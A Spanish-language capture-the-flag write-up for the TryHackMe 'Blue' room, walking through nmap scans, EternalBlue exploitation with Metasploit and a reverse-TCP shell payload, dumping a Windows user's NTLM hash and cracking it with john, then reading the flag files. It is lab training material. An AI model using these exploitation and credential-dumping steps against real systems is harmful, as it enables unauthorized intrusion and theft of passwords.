# Blue

## Información General

<h3>Dificultad: <img src="https://img.shields.io/badge/F%C3%A1cil-green?style=flat-square"> </h3>

<h3> Sistema operativo: Windows</h3> 

<h3> Fecha de resolución: 18/06/2025 </h3>

<h3>Enlace de la mv: <a href="https://tryhackme.com/room/blue" target="_blank">Blue</a></h3>

### *Leer el documentro en Ingles* <a href="blue_ingles.md">Blue</a>

## Reconocimiento

TryHackme nos proporciona la ip de la máquina objetivo.

## Escaneo de puertos abiertos

### Escaneo de puerto TCP

El comando que usaremos siempre con nmap es:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn <ip de la máquina objetivo>
```
<p align="center"> 
<img src="images/nmap1.png" width="600" alt="Resultado de Nmap">
</p>

<p align="center"> 
<img src="images/nmap2.png" width="600" alt="Resultado de Nmap">
</p>

<div align="center">

| Open port | Service      | Version                                                 |
| --------- | ------------ | ------------------------------------------------------- |
| 135       | msrpc        | Microsoft Windows RPC                                   |
| 139       | netbios-ssn  | Microsoft Windows netbios-ssn                           |
| 445       | microsoft-ds | Windows 7 Professional 7601 Service Pack 1 microsoft-ds |
| 3389      | tcpwrapped   | -                                                       |
| 49152     | msrpc        | syn-ack ttl 127 Microsoft Windows RPC                   |
| 49153     | msrpc        | syn-ack ttl 127 Microsoft Windows RPC                   |
| 49154     | msrpc        | syn-ack ttl 127 Microsoft Windows RPC                   |
| 49158     | msrpc        | syn-ack ttl 127 Microsoft Windows RPC                   |
| 49159     | msrpc        | syn-ack ttl 127 Microsoft Windows RPC                   |

</div>

### Escaneo de puerto UDP

```
nmap -sU --top-ports 200 --min-rate=5000 -Pn <Ip de la victima>
```

<p align="center"> 
<img src="images/UDP.png" width="600" alt="Resultado de Nmap">
</p>

<div align="center">

| Open Port | SERVICE    |
| --------- | ---------- |
| 137       | netbios-ns |

</div>

## Exploración

A continuación, vamos a intentar detectar alguna vulnerabilidad con nmap con el siguiente comando:

```
nmap --script smb-vuln* -p445 <Ip de la victima> -Pn
```

<p align="center"> 
<img src="images/VULN.png" width="600" alt="Resultado de Nmap">
</p>

Busco información sobre esta vulnerabilidad en está página, buscando en el buscador el nombre del CVE: <a href="https://www.cvedetails.com/cve/CVE-2017-0143/" target="_blank">CVE-2017-0143</a>

<p align="center"> 
<img src="images/CVE.png" width="600" alt="Resultado de Nmap">
</p>

## Explotación

A continuación, usaremos metasploit

Y buscamos la vulnerabilidad por  **su nombre o por el CVE**

```
search CVE-2017-0143
```

<p align="center"> 
<img src="images/exploit.png" width="600" alt="Resultado de Nmap">
</p>

```
use 0
show options
```

<p align="center"> 
<img src="images/eternablue.png" width="600" alt="Resultado de Nmap">
</p>

Nos faltaría por completar:

RHOTS --> IP Mv victima
RPORT--> Puerto vulnerable de mv victima
LHOST --> IP Mv atacante
LPORT --> Puerto de escucha

```
set RHOSTS 10.10.188.205
set LHOST 10.8.139.36
set PAYLOAD windows/x64/shell/reverse_tcp
show options
run
```
<p align="center"> 
<img src="images/eternablue2.png" width="600" alt="Resultado de Nmap">
</p>

```
hashdump
```

<p align="center"> 
<img src="images/hashdump.png" width="600" alt="Resultado de Nmap">
</p>

En una terminal aparte, copio esto:

```
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
Lo guardo como **hash.txt**, y ejecuto el siguiente comando:

```
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

--format=NT: especifica que los hashes son de tipo NTLM.

NTLM se refiere al tipo de hash que se genera cuando un usuario establece una contraseña en Windows

<p align="center"> 
<img src="images/hash.png" width="600" alt="Resultado de Nmap">
</p>

**Todo esto lo hago porque la página tryhackme, me lo pide**

Luego, en la sesion de **Meterpreter**, escribo lo siguiente:

```
shell
```

<p align="center"> 
<img src="images/shell.png" width="600" alt="Resultado de Nmap">
</p>

Luego, me situo en la raiz.

<p align="center"> 
<img src="images/raiz.png" width="600" alt="Resultado de Nmap">
</p>

Para visualizar el contenido del primer flag, uso el siguiente comando:

```
type flag1.txt
```

<p align="center"> 
<img src="images/flag1.png" width="600" alt="Resultado de Nmap">
</p>

Luego para buscar el siguiente flag2.txt, usare el siguiente comando:

```
dir flag2.txt /s /b
```

/s --> Busca en todos los subdirectorios\
/b --> Muestra solo la ruta del archivo

<p align="center"> 
<img src="images/dir1.png" width="600" alt="Resultado de Nmap">
</p>

Nos situamos en la siguiente ruta **\Windows\System32\config\flag2.txt**

```
type flag2.txt
```

<p align="center"> 
<img src="images/flag2.png" width="600" alt="Resultado de Nmap">
</p>

Luego para encontrar el ultimo flag, usamos este ultimo comando:

```
dir flag3.txt /s /b
```

<p align="center"> 
<img src="images/dir2.png" width="600" alt="Resultado de Nmap">
</p>

Luego, para visualizarlo usamos este otro comando:

```
type Users\Jon\Documents\flag3.txt
```
<p align="center"> 
<img src="images/flag3.png" width="600" alt="Resultado de Nmap">
</p>

**Anotación importante:** Para usar este comando "*dir **<nombre_del_fichero>** /s /b*" lo recomendable es hacerlo desde la carpeta raíz  **/**, con el objetivo que lo busque en todos los subdirectorios.